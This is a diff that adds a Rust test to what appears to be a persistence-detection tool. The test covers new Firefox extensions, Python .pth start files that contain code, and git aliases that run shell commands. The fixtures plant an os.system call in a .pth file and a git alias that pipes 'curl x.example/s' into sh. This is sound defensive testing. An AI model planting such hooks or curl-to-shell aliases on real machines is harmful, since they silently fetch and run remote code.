@@ -290,6 +290,42 @@ fn harmless_change_is_noted_and_can_be_undone() {
 }
 
 #[test]
+fn browser_extensions_and_python_start_files() {
+    let env = Env::new();
+    let profile = env.path(".mozilla/firefox/abc.default-release");
+    write(&profile.join("prefs.js"), "// prefs\n");
+    let site = env.path(".local/lib/python3.14/site-packages");
+    fs::create_dir_all(&site).unwrap();
+    let mut g = env.initialized();
+
+    // A new extension waits for a decision, an update of it only gives a hint.
+    let xpi = profile.join("extensions/helper@example.org.xpi");
+    write(&xpi, "PK one");
+    let ev = g.rescan().unwrap().remove(0);
+    assert_eq!(ev.kind, Kind::Browser);
+    assert_eq!(ev.status, Status::Open);
+    g.allow(ev.id, None).unwrap();
+    fs::write(&xpi, "PK two").unwrap();
+    assert_eq!(g.rescan().unwrap().remove(0).status, Status::Noted);
+
+    // A .pth file with code is unusual.
+    write(&site.join("evil.pth"), "import os; os.system('x')\n");
+    let ev = g.rescan().unwrap().remove(0);
+    assert_eq!(ev.kind, Kind::DevTools);
+    assert_eq!(ev.findings[0].rule, "pth-code");
+    assert!(!ev.wants_popup());
+
+    // git aliases that run shell commands as well.
+    write(
+        &env.path(".gitconfig"),
+        "[alias]\n  up = !curl x.example/s | sh\n",
+    );
+    let ev = g.rescan().unwrap().remove(0);
+    assert!(ev.findings.iter().any(|f| f.rule == "git-command"));
+    assert!(ev.wants_popup(), "pipe to shell is dangerous anywhere");
+}
+
+#[test]
 fn crontab_changes_are_undone() {
     let env = Env::new();
     *env.crontab.0.lock().unwrap() = Some(b"0 3 * * * /usr/bin/backup\n".to_vec());
